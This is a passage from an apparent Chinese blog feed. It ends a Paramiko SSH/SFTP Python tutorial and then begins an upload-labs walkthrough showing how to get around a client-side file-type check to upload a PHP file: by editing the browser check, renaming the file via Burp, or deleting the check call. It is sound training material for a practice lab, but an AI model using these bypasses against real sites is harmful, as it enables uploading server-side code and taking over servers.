class=&#34;comment&#34;&gt;# 获取SFTP实例&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sftp = paramiko.SFTPClient.from_transport(tran)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 设置上传的文件/远程文件路径&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;localpath = &lt;span class=&#34;string&#34;&gt;&amp;#x27;/root/1.txt&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;remotepath = &lt;span class=&#34;string&#34;&gt;&amp;#x27;/root/1.txt&amp;#x27;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 执行上传动作&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sftp.put(localpath, remotepath)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;# 执行下载动作&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;sftp.get(remotepath, localpath)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;tran.close()&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;执行结果:&lt;/p&gt;
&lt;p&gt;客户端&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210111094758768.png&#34; alt=&#34;image-20210111094758768&#34;&gt;&lt;/p&gt;
&lt;p&gt;服务端&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210111094758768.png&#34; alt=&#34;image-20210111094758768&#34;&gt;&lt;/p&gt;
&lt;h3 id=&#34;paramiko的综合使用例子&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#paramiko的综合使用例子&#34;&gt;#&lt;/a&gt; Paramiko 的综合使用例子&lt;/h3&gt;
&lt;figure class=&#34;highlight python&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;26&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;27&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;28&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;29&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;30&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;31&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;32&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;33&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;34&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;35&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;36&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;37&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;38&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;39&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;40&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;41&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;42&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;43&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;44&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;45&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;46&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;47&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;48&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;49&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;50&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;51&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;52&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;53&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;54&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;55&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;56&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;57&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;58&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;59&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;60&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;61&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;62&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;63&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;64&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;65&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;66&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;67&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;class&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;class&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;SSHConnection&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;span class=&#34;built_in&#34;&gt;object&lt;/span&gt;&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__init__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, host_dict&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.host = host_dict[&lt;span class=&#34;string&#34;&gt;&amp;#x27;host&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.port = host_dict[&lt;span class=&#34;string&#34;&gt;&amp;#x27;port&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.username = host_dict[&lt;span class=&#34;string&#34;&gt;&amp;#x27;username&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.pwd = host_dict[&lt;span class=&#34;string&#34;&gt;&amp;#x27;pwd&amp;#x27;&lt;/span&gt;]&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.__k = &lt;span class=&#34;literal&#34;&gt;None&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;connect&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        transport = paramiko.Transport((self.host,self.port))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        transport.connect(username=self.username,password=self.pwd)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.__transport = transport&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;close&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.__transport.close()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;run_cmd&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self, command&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;         执行shell命令,返回字典&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;         return &amp;#123;&amp;#x27;color&amp;#x27;: &amp;#x27;red&amp;#x27;,&amp;#x27;res&amp;#x27;:error&amp;#125;或&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;         return &amp;#123;&amp;#x27;color&amp;#x27;: &amp;#x27;green&amp;#x27;, &amp;#x27;res&amp;#x27;:res&amp;#125;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        :param command:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        :return:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;        &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ssh = paramiko.SSHClient()&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        ssh._transport = self.__transport&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 执行命令&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        stdin, stdout, stderr = ssh.exec_command(command)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 获取命令结果&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        res = unicode_utils.to_str(stdout.read())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 获取错误信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        error = unicode_utils.to_str(stderr.read())&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 如果有错误信息，返回error&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 否则返回res&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; error.strip():&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;color&amp;#x27;&lt;/span&gt;:&lt;span class=&#34;string&#34;&gt;&amp;#x27;red&amp;#x27;&lt;/span&gt;,&lt;span class=&#34;string&#34;&gt;&amp;#x27;res&amp;#x27;&lt;/span&gt;:error&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;#x27;color&amp;#x27;&lt;/span&gt;: &lt;span class=&#34;string&#34;&gt;&amp;#x27;green&amp;#x27;&lt;/span&gt;, &lt;span class=&#34;string&#34;&gt;&amp;#x27;res&amp;#x27;&lt;/span&gt;:res&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;upload&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self,local_path, target_path&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 连接，上传&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sftp = paramiko.SFTPClient.from_transport(self.__transport)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 将location.py 上传至服务器 /tmp/test.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sftp.put(local_path, target_path, confirm=&lt;span class=&#34;literal&#34;&gt;True&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# print(os.stat(local_path).st_mode)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 增加权限&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# sftp.chmod(target_path, os.stat(local_path).st_mode)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sftp.chmod(target_path, &lt;span class=&#34;number&#34;&gt;0o755&lt;/span&gt;)  &lt;span class=&#34;comment&#34;&gt;# 注意这里的权限是八进制的，八进制需要使用0o作为前缀&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt; &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;download&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self,target_path, local_path&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 连接，下载&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sftp = paramiko.SFTPClient.from_transport(self.__transport)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;# 将location.py 下载至服务器 /tmp/test.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        sftp.get(target_path, local_path)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;# 销毁&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;__del__&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;self&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        self.close()　　&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;comment&#34;&gt;#unicode_utils.py&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;def&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;to_str&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;bytes_or_str&lt;/span&gt;):&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    把byte类型转换为str&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    :param bytes_or_str:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    :return:&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;string&#34;&gt;    &amp;quot;&amp;quot;&amp;quot;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; &lt;span class=&#34;built_in&#34;&gt;isinstance&lt;/span&gt;(bytes_or_str, &lt;span class=&#34;built_in&#34;&gt;bytes&lt;/span&gt;):&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        value = bytes_or_str.decode(&lt;span class=&#34;string&#34;&gt;&amp;#x27;utf-8&amp;#x27;&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;else&lt;/span&gt;:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        value = bytes_or_str&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; value&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
 ]]></description>
        </item>
        <item>
            <guid isPermalink="true">https://chungod.github.io/2021/05/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</guid>
            <title>upload-labs通关记录</title>
            <link>https://chungod.github.io/2021/05/01/upload-labs%E9%80%9A%E5%85%B3%E8%AE%B0%E5%BD%95/</link>
            <category>upload-labs通关记录</category>
            <pubDate>Sat, 01 May 2021 23:24:41 +0800</pubDate>
            <description><![CDATA[ &lt;h1 id=&#34;upload-labs通关记录总计&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#upload-labs通关记录总计&#34;&gt;#&lt;/a&gt; upload-labs 通关记录总计&lt;/h1&gt;
&lt;h2 id=&#34;pass-01前端绕过&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pass-01前端绕过&#34;&gt;#&lt;/a&gt; Pass-01 (前端绕过)&lt;/h2&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306140038674.png&#34; alt=&#34;image-20210306140038674&#34;&gt;&lt;/p&gt;
&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;三种方法：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;前端绕过，jpg改php，删除&amp;quot;return checkFile()&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;题目源码&lt;/p&gt;
&lt;figure class=&#34;highlight php&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;keyword&#34;&gt;function&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;checkFile&lt;/span&gt;(&lt;span class=&#34;params&#34;&gt;&lt;/span&gt;) &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; file = document.getElementsByName(&lt;span class=&#34;string&#34;&gt;&amp;#x27;upload_file&amp;#x27;&lt;/span&gt;)[&lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;].value;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (file == &lt;span class=&#34;literal&#34;&gt;null&lt;/span&gt; || file == &lt;span class=&#34;string&#34;&gt;&amp;quot;&amp;quot;&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        alert(&lt;span class=&#34;string&#34;&gt;&amp;quot;请选择要上传的文件!&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//定义允许上传的文件类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; allow_ext = &lt;span class=&#34;string&#34;&gt;&amp;quot;.jpg|.png|.gif&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//提取上传文件的类型&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; ext_name = file.substring(file.lastIndexOf(&lt;span class=&#34;string&#34;&gt;&amp;quot;.&amp;quot;&lt;/span&gt;));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;//判断上传文件类型是否允许上传&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (allow_ext.indexOf(ext_name + &lt;span class=&#34;string&#34;&gt;&amp;quot;|&amp;quot;&lt;/span&gt;) == -&lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;) &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;var&lt;/span&gt; errMsg = &lt;span class=&#34;string&#34;&gt;&amp;quot;该文件不允许上传，请上传&amp;quot;&lt;/span&gt; + allow_ext + &lt;span class=&#34;string&#34;&gt;&amp;quot;类型的文件,当前文件类型为：&amp;quot;&lt;/span&gt; + ext_name;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        alert(errMsg);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;literal&#34;&gt;false&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;p&gt;第一种方法 - 前端绕过&lt;/p&gt;
&lt;p&gt;添加允许上传为 php 文件&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306140551825.png&#34; alt=&#34;image-20210306140551825&#34;&gt;&lt;/p&gt;
&lt;p&gt;上传 a.php，成功上传&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306140637377.png&#34; alt=&#34;image-20210306140637377&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306140716311.png&#34; alt=&#34;image-20210306140716311&#34;&gt;&lt;/p&gt;
&lt;p&gt;第二种方法 - burp 抓包进行改包&lt;/p&gt;
&lt;p&gt;上传 b.jpg 进行 burp 抓包，改为 b.php 成功上传&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306141026280.png&#34; alt=&#34;image-20210306141026280&#34;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img data-src=&#34;https://gitee.com/chungod/picture/raw/master/image/image-20210306141056357.png&#34; alt=&#34;image-20210306141056357&#34;&gt;&lt;/p&gt;
&lt;p&gt;第三种方法 - 删除 &amp;quot;return checkFile ()&amp;quot;&lt;/p&gt;
